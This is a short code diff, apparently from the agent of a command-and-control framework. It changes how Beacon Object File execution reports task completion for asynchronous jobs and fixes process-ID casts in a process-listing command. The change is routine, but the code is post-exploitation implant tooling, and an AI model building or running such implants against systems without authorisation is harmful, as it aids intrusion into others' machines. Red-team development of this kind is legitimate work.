@@ -332,8 +332,23 @@ void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	if (bofPacker->datasize() > 8)
 		outPacker->PackFlatBytes(bofPacker->data(), bofPacker->datasize());
 
-	outPacker->Pack32(taskId);
-	outPacker->Pack32(commandId);
+    // Check if an Async Job was registered for this task.
+    // If so, DO NOT send the completion packet (COMMAND_EXEC_BOF / 50) yet.
+    // The task must remain "Runnning" for the Console Bridge to stream output.
+    bool hasAsyncJob = false;
+    if (agent->jober) {
+        for (int i = 0; i < agent->jober->jobs.size(); i++) {
+            if (agent->jober->jobs[i].jobId == taskId) {
+                hasAsyncJob = true;
+                break;
+            }
+        }
+    }
+
+    if (!hasAsyncJob) {
+	    outPacker->Pack32(taskId);
+	    outPacker->Pack32(commandId);
+    }
 
 	bofPacker->Clear(TRUE);
 }
@@ -705,8 +720,8 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 				ConvertUnicodeStringToChar(spi->ImageName.Buffer, spi->ImageName.Length, processName, sizeof(processName));
 
-				outPacker->Pack16((WORD)spi->UniqueProcessId);
-				outPacker->Pack16((WORD)spi->InheritedFromUniqueProcessId);
+				outPacker->Pack16((WORD) (uintptr_t) spi->UniqueProcessId);
+				outPacker->Pack16((WORD) (uintptr_t) spi->InheritedFromUniqueProcessId);
 				outPacker->Pack16((WORD)spi->SessionId);
 				outPacker->Pack8(arch64);
 				outPacker->Pack8(elevated);
